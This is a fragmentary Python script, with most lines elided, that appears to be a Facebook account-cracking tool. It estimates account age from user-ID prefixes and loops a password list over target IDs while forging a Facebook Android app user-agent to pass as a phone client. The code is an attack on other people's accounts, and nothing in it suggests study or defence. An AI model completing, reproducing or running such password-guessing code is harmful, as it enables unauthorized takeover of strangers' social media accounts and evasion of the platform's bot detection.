...
def alex(uid):
    if len(uid)==15:
        ...
        elif uid[:5] in ['10009', '61550', '61551','61552','61553']           :alif = '2023'
        else:alif=''
...
def ffb(ids,names,passlist):
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        ua = '[FBAN/FB4A;FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=3.3,width=1080,height=1421};FBLC/en_US;FBRV/'+fbrv+';FBCR/TNT;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 4;FBSV/'+fbsv+';FBOP/1;FBCA/arm64-v8a:;]'               
